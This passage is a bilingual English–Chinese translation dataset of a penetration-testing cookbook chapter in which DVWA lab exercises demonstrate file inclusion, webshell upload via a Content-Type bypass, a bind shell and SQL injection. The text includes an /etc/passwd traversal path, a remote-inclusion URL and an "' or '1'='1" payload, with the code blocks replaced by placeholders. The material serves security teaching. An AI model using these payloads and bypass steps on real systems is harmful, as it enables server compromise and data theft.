- en: Exploiting Injection Vulnerabilities
  id: totrans-0
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 利用注入漏洞
- en: 'In this chapter we will cover the following topics:'
  id: totrans-1
  prefs: []
  type: TYPE_NORMAL
  zh: 在本章中，我们将涵盖以下主题：
- en: Looking for file inclusions
  id: totrans-2
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 寻找文件包含
- en: Abusing file inclusions and uploads
  id: totrans-3
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 滥用文件包含和上传
- en: Manually identifying SQL injection
  id: totrans-4
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 手动识别 SQL 注入
- en: Step-by-step error-based SQL injection
  id: totrans-5
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 按步骤进行的基于错误的 SQL 注入
- en: Identifying and exploiting blind SQL injections
  id: totrans-6
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 识别和利用盲 SQL 注入
- en: Finding and exploiting SQL injections with SQLMap
  id: totrans-7
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 使用 SQLMap 查找并利用 SQL 注入
- en: Exploiting an XML External Entity injection
  id: totrans-8
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 利用 XML 外部实体注入
- en: Detecting and exploiting command injection vulnerabilities
  id: totrans-9
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 检测和利用命令注入漏洞
- en: Introduction
  id: totrans-10
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 介绍
- en: According to the OWASP Top 10 2017 list ([https://www.owasp.org/index.php/Top_10-2017_Top_10](https://www.owasp.org/index.php/Top_10-2017_Top_10)),
    injection flaws, such as SQL, operating system commands, and XML injection, are
    the most prevalent vulnerabilities and have the highest impact of all web application
    vulnerabilities.
  id: totrans-11
  prefs: []
  type: TYPE_NORMAL
  zh: 根据 OWASP Top 10 2017 列表（[https://www.owasp.org/index.php/Top_10-2017_Top_10](https://www.owasp.org/index.php/Top_10-2017_Top_10)），注入漏洞，如
    SQL、操作系统命令和 XML 注入，是最常见的漏洞，并且它们对所有 web 应用程序漏洞的影响最大。
- en: Injection flaws occur when untrusted data coming from user-provided parameters
    is to be interpreted by the server. An attacker can then trick the interpreter
    into treating this data as executable instructions, making it execute unintended
    commands or gaining access to data without proper authorization.
  id: totrans-12
  prefs: []
  type: TYPE_NORMAL
  zh: 注入漏洞发生在来自用户提供的、不可信数据需要被服务器解释时。攻击者可以欺骗解释器将这些数据当作可执行指令，从而使其执行非预期的命令或在没有适当授权的情况下访问数据。
- en: In this chapter, we will discuss the major injection flaws in today's web applications,
    and will also look at tools and techniques to use in order to detect and exploit
    them.
  id: totrans-13
  prefs: []
  type: TYPE_NORMAL
  zh: 在本章中，我们将讨论当今 web 应用程序中的主要注入漏洞，并且还会查看用于检测和利用这些漏洞的工具和技术。
- en: Looking for file inclusions
  id: totrans-14
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 寻找文件包含
- en: File inclusion vulnerabilities occur when developers use request parameters,
    which can be modified by users, to dynamically choose which pages to load or to
    include in the code the server will execute. Such vulnerabilities may cause a
    full system compromise if the server executes the included file.
  id: totrans-15
  prefs: []
  type: TYPE_NORMAL
  zh: 文件包含漏洞发生在开发者使用用户可以修改的请求参数来动态选择加载哪些页面或将哪些代码包含在服务器将要执行的代码中时。此类漏洞可能导致系统完全被攻陷，如果服务器执行了包含的文件。
- en: In this recipe, we will test a web application to discover whether it is vulnerable
    to file inclusions.
  id: totrans-16
  prefs: []
  type: TYPE_NORMAL
  zh: 在这个实例中，我们将测试一个 web 应用程序，以发现它是否容易受到文件包含的攻击。
- en: How to do it...
  id: totrans-17
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 如何执行...
- en: 'We will use **Damn Vulnerable Web Application** (**DVWA**) for this recipe,
    so we need both the Kali and vulnerable virtual machines. Let''s take a look at
    the following steps:'
  id: totrans-18
  prefs: []
  type: TYPE_NORMAL
  zh: 我们将使用 **Damn Vulnerable Web Application** (**DVWA**) 来进行本实例，因此我们需要 Kali 和易受攻击的虚拟机。让我们来看看以下步骤：
- en: Log into DVWA and go to File Inclusion.
  id: totrans-19
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 登录到 DVWA 并进入文件包含页面。
- en: 'It says that we should edit the `GET` parameter `page` to test the inclusion,
    so let''s try with `index.php`. The result is shown in the following screenshot:'
  id: totrans-20
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 说明中提到我们应该编辑 `GET` 参数 `page` 来测试包含，因此我们尝试使用 `index.php`。结果如下所示：
- en: '![](assets/4a8bf4f1-c4d0-42b9-912d-abc94d3e9aa4.png)'
  id: totrans-21
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/4a8bf4f1-c4d0-42b9-912d-abc94d3e9aa4.png)'
- en: It seems that there is no `index.php` file in that directory (or it is empty).
    Maybe this means that **Local File Inclusion** (**LFI**) is possible.
  id: totrans-22
  prefs: []
  type: TYPE_NORMAL
  zh: 看起来在该目录中没有 `index.php` 文件（或者文件为空）。也许这意味着 **本地文件包含** (**LFI**) 是可能的。
- en: 'To try LFI, we need to know the name of a file that really exists locally.
    We know that there is an `index.php` in the root directory of DVWA, so we try
    directory traversal together with file inclusion. Set `../../index.php` to the
    page variable, and we get the following:'
  id: totrans-23
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 要尝试 LFI，我们需要知道一个真实存在于本地的文件名。我们知道 DVWA 根目录下有一个 `index.php` 文件，因此我们尝试结合目录遍历和文件包含。将
    `../../index.php` 设置为页面变量，然后我们得到以下结果：
- en: '![](assets/7e577f84-4349-457b-999c-7256289f7465.png)'
  id: totrans-24
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/7e577f84-4349-457b-999c-7256289f7465.png)'
- en: With this, we have demonstrated that LFI and directory traversal are both possible
    (by using `*../../*`, we traverse the directory tree).
  id: totrans-25
  prefs: []
  type: TYPE_NORMAL
  zh: 通过这个，我们演示了 LFI 和目录遍历都可以成功（通过使用 `*../../*`，我们遍历了目录树）。
- en: 'The next step is to try **Remote File Inclusion** (**RFI**), which is including
    a file hosted in another server instead of a local file. As our vulnerable virtual
    machine does not have internet access (or it should not have, for security reasons),
    we will try and include a file hosted in our Kali machine. Open a Terminal in
    Kali and start the Apache service:'
  id: totrans-26
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 下一步是尝试**远程文件包含**（**RFI**），即包含托管在另一台服务器上的文件，而不是本地文件。由于我们的易受攻击虚拟机没有互联网访问权限（或者出于安全原因不应该有），我们将尝试包含托管在
    Kali 机器上的文件。在 Kali 中打开终端并启动 Apache 服务：
- en: '[PRE0]'
  id: totrans-27
  prefs: []
  type: TYPE_PRE
  zh: '[PRE0]'
- en: 'Now, in the browser, let''s include our Kali home page by entering the URL
    of the page as a parameter on the vulnerable application, `http://192.168.56.11/dvwa/vulnerabilities/fi/?page=http://192.168.56.10/index.html`,
    as shown in the following screenshot:'
  id: totrans-28
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 现在，在浏览器中，我们通过将页面的 URL 作为参数输入到易受攻击的应用程序中，来包含我们的 Kali 首页，网址为`http://192.168.56.11/dvwa/vulnerabilities/fi/?page=http://192.168.56.10/index.html`，如下所示的截图：
- en: '![](assets/9d55db72-042c-46f2-bfca-49d3f8bdca98.png)'
  id: totrans-29
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/9d55db72-042c-46f2-bfca-49d3f8bdca98.png)'
- en: We were able to make the application load an external page by entering its full
    URL in the parameter. This means it is vulnerable to RFI. If the included file
    contains executable server-side code (PHP, for example), such code will be executed
    by the server, allowing an attacker to remotely execute commands, which makes
    a full system compromise very likely.
  id: totrans-30
  prefs: []
  type: TYPE_NORMAL
  zh: 我们能够通过在参数中输入完整的 URL 来使应用程序加载外部页面。这意味着它容易受到 RFI 攻击。如果包含的文件包含可执行的服务器端代码（例如 PHP），则该代码将在服务器上执行，从而允许攻击者远程执行命令，这使得完全系统妥协的可能性非常大。
- en: How it works...
  id: totrans-31
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 它是如何工作的...
- en: 'If we use the View Source button in DVWA, we can see the server-side source
    code is as follows:'
  id: totrans-32
  prefs: []
  type: TYPE_NORMAL
  zh: 如果我们在 DVWA 中使用查看源代码按钮，我们可以看到服务器端的源代码如下：
- en: '[PRE1]'
  id: totrans-33
  prefs: []
  type: TYPE_PRE
  zh: '[PRE1]'
- en: This means the `page` variable's value is passed directly to the filename, and
    then it is included in the code. With this, we can include and execute any PHP
    or HTML file we want in the server, as long as it is accessible through the network.
    To be vulnerable to RFI, the server must include `allow_url_fopen` and `allow_url_include`
    in its configuration. Otherwise, it will only be LFI, if the file inclusion vulnerability
    is present.
  id: totrans-34
  prefs: []
  type: TYPE_NORMAL
  zh: 这意味着`page`变量的值直接传递到文件名中，然后它被包含在代码中。通过这种方式，我们可以在服务器上包含并执行任何我们想要的 PHP 或 HTML 文件，只要它可以通过网络访问。要受到
    RFI 攻击，服务器必须在其配置中包含`allow_url_fopen`和`allow_url_include`。否则，如果文件包含漏洞存在，它将仅为 LFI。
- en: There's more...
  id: totrans-35
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 还有更多...
- en: We can also use LFI to display relevant files in the host operating system.
    Try, for example including `../../../../../../etc/passwd`, and you will get a
    list of system users, their home directories, and their default shells.
  id: totrans-36
  prefs: []
  type: TYPE_NORMAL
  zh: 我们还可以使用 LFI 来显示主机操作系统中的相关文件。例如，尝试包含`../../../../../../etc/passwd`，你将获得一个系统用户列表，包括他们的主目录和默认的
    Shell。
- en: Abusing file inclusions and uploads
  id: totrans-37
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 滥用文件包含和上传
- en: As we saw in the previous recipe, file inclusion vulnerabilities occur when
    developers use poorly validated input to generate file paths and use those paths
    to include source code files. Modern versions of server-side languages, such as
    PHP since 5.2.0, have disabled the ability to include remote files by default,
    so it has been less common to find an RFI since 2011.
  id: totrans-38
  prefs: []
  type: TYPE_NORMAL
  zh: 正如我们在前一个食谱中看到的，文件包含漏洞发生在开发人员使用验证不充分的输入生成文件路径并用这些路径包含源代码文件时。从 PHP 5.2.0 开始，现代版本的服务器端语言默认禁用了远程文件包含的能力，因此自
    2011 年以来，RFI 攻击变得不太常见。
- en: In this recipe, we will first upload a malicious file, namely a `webshell` (a
    web page capable of executing system commands in the server), and execute it using
    LFI.
  id: totrans-39
  prefs: []
  type: TYPE_NORMAL
  zh: 在这个食谱中，我们将首先上传一个恶意文件，即一个`webshell`（能够在服务器上执行系统命令的网页），并通过 LFI 执行它。
- en: Getting ready
  id: totrans-40
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 准备工作
- en: In this recipe, we will upload a file to the server. We need to know where is
    it going to be stored in order to be able to access it via programming. To get
    the upload location, go to Upload in DVWA and upload any JPG image. If the upload
    is successful, it will display the path to which it was uploaded (`../../hackable/uploads/`).
    Now we know the relative path where the application saves the uploaded files;
    that's enough for this recipe.
  id: totrans-41
  prefs: []
  type: TYPE_NORMAL
  zh: 在这个食谱中，我们将把文件上传到服务器。我们需要知道它将存储在哪里，以便通过编程访问它。为了获取上传位置，进入 DVWA 的上传页面并上传任何 JPG
    图片。如果上传成功，它将显示上传的路径（`../../hackable/uploads/`）。现在我们知道了应用程序保存上传文件的相对路径；这对这个食谱来说足够了。
- en: 'Now create a file called `webshell.php` with the following content:'
  id: totrans-42
  prefs: []
  type: TYPE_NORMAL
  zh: 现在创建一个名为`webshell.php`的文件，内容如下：
- en: '[PRE2]'
  id: totrans-43
  prefs: []
  type: TYPE_PRE
  zh: '[PRE2]'
- en: Notice how the `action` parameter includes the upload path we got from uploading
    the JPG file.
  id: totrans-44
  prefs: []
  type: TYPE_NORMAL
  zh: 请注意，`action`参数中包含了我们通过上传JPG文件获得的上传路径。
- en: How to do it...
  id: totrans-45
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 如何做到...
- en: 'Let''s raise the bar a little bit by adding some protections to the vulnerable
    page: log into DVWA, go to DVWA Security, and set the security level to Medium.
    Now we can start testing:'
  id: totrans-46
  prefs: []
  type: TYPE_NORMAL
  zh: 让我们稍微提高难度，为这个脆弱的页面添加一些保护：登录到DVWA，进入DVWA安全设置，将安全级别设置为中等。现在我们可以开始测试：
- en: 'First, let''s try to upload our file. In DVWA, go to Upload and try to upload
    `webshell.php`:'
  id: totrans-47
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 首先，尝试上传我们的文件。在DVWA中，进入上传页面并尝试上传`webshell.php`：
- en: '![](assets/d18a5299-4709-421e-b6eb-597ca25450f5.png)'
  id: totrans-48
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/d18a5299-4709-421e-b6eb-597ca25450f5.png)'
- en: So, there is a validation of what we can upload, and the file needs to be an
    image; we will need to bypass this protection in order to upload our `webshell`.
  id: totrans-49
  prefs: []
  type: TYPE_NORMAL
  zh: 所以，上传的文件需要是图像，存在对上传内容的验证；为了上传我们的`webshell`，我们需要绕过这个保护机制。
- en: An easy way to avoid the validation is to rename our PHP file with a valid extension.
    But this would cause the server and browser to treat it like an image, and the
    code wouldn't execute. Instead, we will work around this protection by modifying
    the request's parameters.  Set up Burp Suite as an intercepting proxy.
  id: totrans-50
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 避免验证的一种简单方法是将PHP文件重命名为有效的扩展名。但是这会导致服务器和浏览器将其视为图像，而代码无法执行。相反，我们将通过修改请求的参数来绕过此保护机制。设置Burp
    Suite作为拦截代理。
- en: Select the `webshell.php` file for uploading.
  id: totrans-51
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 选择`webshell.php`文件进行上传。
- en: 'Enable interception in Burp Suite and click Upload. The intercepted request
    is shown in the following screenshot:'
  id: totrans-52
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 在Burp Suite中启用拦截并点击上传。拦截到的请求如下面的截图所示：
- en: '![](assets/09c073dd-521d-4325-9cff-2a83927ccfea.png)'
  id: totrans-53
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/09c073dd-521d-4325-9cff-2a83927ccfea.png)'
- en: You can see that the request is `multipart`. This means it has multiple, separate
    components, each one with its header section. Notice the `Content-Type` header
    in the second part, the one with the content of the file we are trying to upload.
    It says `application/x-php`, which tells the server the file is a PHP script.
  id: totrans-54
  prefs: []
  type: TYPE_NORMAL
  zh: 你可以看到请求是`multipart`类型的，这意味着它有多个独立的部分，每个部分都有自己的头部。请注意第二部分中的`Content-Type`头部，它包含了我们正在尝试上传的文件的内容。它显示为`application/x-php`，这告诉服务器该文件是PHP脚本。
- en: 'Change the value of `Content-Type` in the second part to `image/jpeg` and submit
    the request. As shown in the following screenshot, this will be successful:'
  id: totrans-55
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 将第二部分中的`Content-Type`值修改为`image/jpeg`，然后提交请求。如以下截图所示，这样就可以成功上传：
- en: '![](assets/c5995b40-6884-4940-9abf-3aac631285b7.png)'
  id: totrans-56
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/c5995b40-6884-4940-9abf-3aac631285b7.png)'
- en: The next step is to use this `webshell` to execute system commands on the server.
    Go back to File Inclusion in DVWA.
  id: totrans-57
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 下一步是使用这个`webshell`在服务器上执行系统命令。返回到DVWA的文件包含部分。
- en: 'As we did in the previous recipe, use the `page` parameter to include our `webshell`.
    Remember to use the relative path (`../../hackable/uploads/webshell.php`), as
    shown in the following screenshot:'
  id: totrans-58
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 如我们在前面的食谱中所做，使用`page`参数来包含我们的`webshell`。记得使用相对路径（`../../hackable/uploads/webshell.php`），如下图所示：
- en: '![](assets/a568db98-c14b-4bf1-9231-7a629b637b8e.png)'
  id: totrans-59
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/a568db98-c14b-4bf1-9231-7a629b637b8e.png)'
- en: 'The page `webshell` code is loaded and we can see the Type a command text and
    a text box below it. In the text box, write `/sbin/ifconfig` and hit *Enter*:'
  id: totrans-60
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 页面加载了`webshell`代码，我们可以看到“Type a command”文本和下面的文本框。在文本框中输入`/sbin/ifconfig`并按下*Enter*：
- en: '![](assets/46626564-7295-466d-9152-fbfd83cecb40.png)'
  id: totrans-61
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/46626564-7295-466d-9152-fbfd83cecb40.png)'
- en: And it worked! As we can see in the screenshot, the server has the IP address
    `192.168.56.11`. Now we can execute commands in the server by typing them in the
    textbox or setting a different value to the `cmd` parameter.
  id: totrans-62
  prefs: []
  type: TYPE_NORMAL
  zh: 成功了！如截图所示，服务器的IP地址是`192.168.56.11`。现在，我们可以通过在文本框中输入命令，或为`cmd`参数设置不同的值来执行服务器上的命令。
- en: How it works...
  id: totrans-63
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 它是如何工作的...
- en: 'First, we discovered that the application verifies the files before accepting
    the upload. There are multiple ways for an application to do this. The most simple
    and common ways are to check the file extension and the request''s `Content-Type`
    header; the latter is used in this recipe. To bypass this protection, we changed
    the content type of the file, which is set by default by the browser to `application/x-php`,
    to the type that the server expects so that it will accept the file as an image:
    `image/jpeg`.'
  id: totrans-64
  prefs: []
  type: TYPE_NORMAL
  zh: 首先，我们发现应用程序在接受上传之前会验证文件。应用程序验证文件的方式有多种，最简单和最常见的方法是检查文件扩展名和请求的`Content-Type`头部；此方法在本食谱中使用。为了绕过这一保护机制，我们修改了文件的内容类型，默认情况下浏览器将其设置为`application/x-php`，我们将其修改为服务器期望的类型，以便让服务器将文件作为图像接受：`image/jpeg`。
- en: 'For more information about valid types in HTTP communication, check out the
    following URLs: [https://developer.mozilla.org/en-US/docs/Web/HTTP/Basics_of_HTTP/MIME_types](https://developer.mozilla.org/en-US/docs/Web/HTTP/Basics_of_HTTP/MIME_types),
    and [https://developer.mozilla.org/en-US/docs/Web/HTTP/Basics_of_HTTP/MIME_types/Complete_list_of_MIME_types](https://developer.mozilla.org/en-US/docs/Web/HTTP/Basics_of_HTTP/MIME_types/Complete_list_of_MIME_types).'
  id: totrans-65
  prefs: []
  type: TYPE_NORMAL
  zh: 有关 HTTP 通信中有效类型的更多信息，请查看以下网址：[https://developer.mozilla.org/en-US/docs/Web/HTTP/Basics_of_HTTP/MIME_types](https://developer.mozilla.org/en-US/docs/Web/HTTP/Basics_of_HTTP/MIME_types)
    和 [https://developer.mozilla.org/en-US/docs/Web/HTTP/Basics_of_HTTP/MIME_types/Complete_list_of_MIME_types](https://developer.mozilla.org/en-US/docs/Web/HTTP/Basics_of_HTTP/MIME_types/Complete_list_of_MIME_types)。
- en: The file we uploaded, `webshell.php`, takes a `GET` parameter (`cmd`) and sets
    it as an input parameter to the `system()` function of PHP. What `system` does
    is invoke a system command and display its output in the response to the client.
    The rest of the code is just an HTML form that allows us to input commands over
    and over again. Notice how the action of the form is set to the relative path
    where the file was uploaded. It is done in this way because the file is not being
    called directly, but included. This means its code is interpreted as part of its
    includer's code, hence, all the relative paths and URLs are interpreted from the
    perspective of the file doing the inclusion.
  id: totrans-66
  prefs: []
  type: TYPE_NORMAL
  zh: 我们上传的文件 `webshell.php` 接受一个 `GET` 参数（`cmd`），并将其作为输入参数传递给 PHP 的 `system()` 函数。`system`
    的作用是调用系统命令并将输出显示在响应中返回给客户端。其余代码只是一个 HTML 表单，允许我们一遍又一遍地输入命令。注意，表单的 action 被设置为文件上传的相对路径。这是因为文件并不是直接调用的，而是作为包含文件被引入的。这意味着它的代码会作为包含者代码的一部分被解释，因此，所有相对路径和网址都从包含者的角度来解释。
- en: Once the file is uploaded, we used an LFI vulnerability to execute it and run
    system commands on the server.
  id: totrans-67
  prefs: []
  type: TYPE_NORMAL
  zh: 一旦文件上传完成，我们利用 LFI 漏洞执行了它，并在服务器上运行了系统命令。
- en: There's more...
  id: totrans-68
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 还有更多…
- en: 'Once we are able to upload and execute server-side code, there are a huge number
    of options we can use to compromise the server. For example, in a bind shell,
    we establish a direct connection that allows us to interact directly with the
    server without needing to go through the `webshell`. A very simple way to do this
    is to run the following in the server:'
  id: totrans-69
  prefs: []
  type: TYPE_NORMAL
  zh: 一旦我们能够上传并执行服务器端代码，就有很多方法可以利用它来攻破服务器。例如，在绑定 shell 中，我们建立一个直接连接，允许我们直接与服务器交互，而无需通过
    `webshell`。一个非常简单的做法是在服务器中运行以下命令：
- en: '[PRE3]'
  id: totrans-70
  prefs: []
  type: TYPE_PRE
  zh: '[PRE3]'
- en: 'It will open the TCP port `12345` and listen for a connection. When the connection
    succeeds, it will execute `/bin/bash`, receive its input, and send its output
    through the network to the connected host (the attacking machine). To connect
    to the victim server, let''s say `192.168.56.10`, we run this command in our Kali
    machine:'
  id: totrans-71
  prefs: []
  type: TYPE_NORMAL
  zh: 它将打开 TCP 端口 `12345` 并监听连接。当连接成功时，它会执行 `/bin/bash`，接收输入，并通过网络将输出发送到连接的主机（攻击机）。要连接到受害者服务器，假设为
    `192.168.56.10`，我们在 Kali 机器上运行以下命令：
- en: '[PRE4]'
  id: totrans-72
  prefs: []
  type: TYPE_PRE
  zh: '[PRE4]'
- en: This connects to the server listening on port `12345`. It is also possible to
    make the server download a malicious program, a privilege escalation exploit,
    for example, and execute it to become a user with more privileges.
  id: totrans-73
  prefs: []
  type: TYPE_NORMAL
  zh: 这会连接到监听 `12345` 端口的服务器。也可以让服务器下载一个恶意程序，例如特权提升漏洞，并执行它以成为拥有更多权限的用户。
- en: Manually identifying SQL injection
  id: totrans-74
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 手动识别 SQL 注入
- en: Most modern web applications implement some kind of database, and SQL is the
    most popular language to make queries to databases. In an **SQL injection** (**SQLi**)
    attack, the attacker seeks to abuse the communication between an application and
    a database by making the application send altered queries via the injection of
    SQL commands in form inputs or any other parameter in requests that are used to
    build an SQL statement in the server.
  id: totrans-75
  prefs: []
  type: TYPE_NORMAL
  zh: 大多数现代 web 应用实现了某种数据库，SQL 是用来查询数据库的最流行语言。在 **SQL 注入**（**SQLi**）攻击中，攻击者试图通过在表单输入或请求的任何其他参数中注入
    SQL 命令，来篡改应用与数据库之间的通信，迫使应用发送被修改的查询，这些查询在服务器端被用来构建 SQL 语句。
- en: In this recipe, we will test the inputs of a web application to see whether
    it is vulnerable to error-based SQLi.
  id: totrans-76
  prefs: []
  type: TYPE_NORMAL
  zh: 在本例中，我们将测试一个 web 应用的输入，看它是否容易受到基于错误的 SQL 注入（SQLi）攻击。
- en: How to do it...
  id: totrans-77
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 如何操作…
- en: 'Log into DVWA, go to SQL Injection, and check that the security level is low:'
  id: totrans-78
  prefs: []
  type: TYPE_NORMAL
  zh: 登录到 DVWA，进入 SQL 注入页面，检查安全级别是否为低：
- en: As in previous recipes, let's test the normal behavior of the application by
    introducing a number. Set User ID as `1` and click Submit. By looking at the result,
    we can say that the application queried a database to see whether there is a user
    with an ID equal to one and returned the ID, name, and surname of that user.
  id: totrans-79
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 与之前的步骤一样，先通过输入一个数字来测试应用程序的正常行为。将用户ID设置为`1`并点击提交。通过查看结果，我们可以说应用程序查询了数据库，查看是否存在ID为1的用户，并返回了该用户的ID、姓名和姓氏。
- en: 'Next, we must test what happens if we send something that the application does
    not expect. Introduce `1''` in the textbox and submit that ID. As shown in the
    following screenshot, the application should respond with an error:'
  id: totrans-80
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 接下来，我们必须测试如果发送应用程序没有预期的内容会发生什么。在文本框中输入`1'`并提交该ID。如以下截图所示，应用程序应该会响应一个错误：
- en: '![](assets/0c910232-1b76-4177-927e-5096ce25a9b0.png)'
  id: totrans-81
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/0c910232-1b76-4177-927e-5096ce25a9b0.png)'
- en: This error message tells us that the database received an incorrectly formed
    query. This doesn't mean we can be sure there is an SQLi here, but it is very
    likely that this application is vulnerable.
  id: totrans-82
  prefs: []
  type: TYPE_NORMAL
  zh: 这个错误信息告诉我们数据库收到了一个格式不正确的查询。这并不意味着我们可以确定这里存在SQLi，但很可能这个应用程序是脆弱的。
- en: Return to the DVWA SQL Injection page.
  id: totrans-83
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 返回到DVWA SQL注入页面。
- en: 'To be sure that there is an error-based SQLi, we try another input: `1''''`
    (two apostrophes this time):'
  id: totrans-84
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 为了确认存在基于错误的SQLi，我们尝试另一个输入：`1''`（这次是两个单引号）：
- en: '![](assets/0f949c4e-80be-41ec-ab04-e9ee125af8c2.png)'
  id: totrans-85
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/0f949c4e-80be-41ec-ab04-e9ee125af8c2.png)'
- en: No error this time. This confirms that there is an SQLi vulnerability in the
    application.
  id: totrans-86
  prefs: []
  type: TYPE_NORMAL
  zh: 这次没有错误。这确认了应用程序中存在SQLi漏洞。
- en: 'Now we will perform a very basic SQLi attack. Introduce `''` or `''1''=''1`
    in the textbox and submit. The result should look something like the following:'
  id: totrans-87
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 现在我们将执行一个非常基础的SQLi攻击。在文本框中输入`'`或`'1'='1`并提交。结果应该如下所示：
- en: '![](assets/63830257-82a1-489b-a186-62149e73dbfa.png)'
  id: totrans-88
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/63830257-82a1-489b-a186-62149e73dbfa.png)'
- en: It looks like we just got all the users registered on the database.
  id: totrans-89
  prefs: []
  type: TYPE_NORMAL
  zh: 看起来我们刚刚获取了数据库中注册的所有用户。
- en: How it works...
  id: totrans-90
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 它是如何工作的...
- en: 'SQLi occurs when the input is not validated and sanitized before it is used
    to form a query for the database. Let''s imagine that the server-side code (in
    PHP) in the application composes the query as follows:'
  id: totrans-91
  prefs: []
  type: TYPE_NORMAL
  zh: SQLi发生在输入未经过验证和清理之前就用于构建查询数据库的请求时。假设应用程序中的服务器端代码（用PHP编写）将查询构造如下：
- en: '[PRE5]'
  id: totrans-92
  prefs: []
  type: TYPE_PRE
  zh: '[PRE5]'
- en: 'This means that the data sent in the `id` parameter will be integrated as is
    in the query. If we replace the parameter reference with its value, we have this:'
  id: totrans-93
  prefs: []
  type: TYPE_NORMAL
  zh: 这意味着在`id`参数中发送的数据将直接作为查询的一部分。如果我们将参数引用替换为其值，我们就得到如下：
- en: '[PRE6]'
  id: totrans-94
  prefs: []
  type: TYPE_PRE
  zh: '[PRE6]'
- en: 'So, when we send a malicious input like we did, the line of code is read by
    the PHP interpreter as follows:'
  id: totrans-95
  prefs: []
  type: TYPE_NORMAL
  zh: 因此，当我们发送像之前那样的恶意输入时，PHP解释器会按如下方式读取这行代码：
- en: '[PRE7]'
  id: totrans-96
  prefs: []
  type: TYPE_PRE
  zh: '[PRE7]'
- en: 'And the resulting SQL sentence will look like:'
  id: totrans-97
  prefs: []
  type: TYPE_NORMAL
  zh: 生成的SQL语句将如下所示：
- en: '[PRE8]'
  id: totrans-98
  prefs: []
  type: TYPE_PRE
  zh: '[PRE8]'
- en: That means select everything from the table called `users` if the user `id`
    equals nothing or `1 = 1`; and since one always equals one, all users are going
    to meet these criteria. The first apostrophe we send closes the one opened in
    the original code. After that, we can introduce some SQL code, and the last one
    without a closing apostrophe uses the one already set in the server's code.
  id: totrans-99
  prefs: []
  type: TYPE_NORMAL
  zh: 这意味着如果用户`id`等于空值或`1=1`，就选择`users`表中的所有内容；因为1总是等于1，所以所有用户都符合这些条件。我们发送的第一个单引号关闭了原始代码中打开的那个单引号。之后，我们可以插入一些SQL代码，最后一个没有关闭的单引号将使用服务器代码中已设置的那个。
- en: This is called **error-based SQLi**, and is the most basic form of SQLi because
    we use error messages to figure out whether we have formed a valid query with
    our injection, and the results are displayed directly in the application's output.
  id: totrans-100
  prefs: []
  type: TYPE_NORMAL
  zh: 这被称为**基于错误的SQLi**，是SQLi最基本的形式，因为我们使用错误信息来判断我们是否通过注入构造了有效的查询，并且结果会直接显示在应用程序的输出中。
- en: There's more...
  id: totrans-101
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 还有更多...
- en: An SQLi attack may cause much more damage than simply showing the usernames
    of an application. By exploiting this kind of vulnerability, an attacker may exfiltrate
    all kinds of sensitive information about users, such as contact details and credit
    card numbers. It is also possible to compromise the whole server, and be able
    to execute commands and escalate privileges in it. Also, an attacker may be able
    to extract all the information from the database, including database and system
    users, passwords, and, depending on the server and internal network configuration,
    an SQLi vulnerability may be an entry point for a full network and internal infrastructure
    compromise.
  id: totrans-102
  prefs: []
  type: TYPE_NORMAL
  zh: SQL注入攻击可能造成比仅仅显示应用程序用户名更大的损害。通过利用这种漏洞，攻击者可能会提取用户的各种敏感信息，如联系方式和信用卡号码。还可能会危及整个服务器，能够执行命令并提升权限。此外，攻击者还可能能够提取数据库中的所有信息，包括数据库和系统用户、密码，并且根据服务器和内部网络配置，SQL注入漏洞可能是全面网络和内部基础设施攻陷的入口点。
- en: Step-by-step error-based SQL injections
  id: totrans-103
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 步骤式基于错误的SQL注入攻击
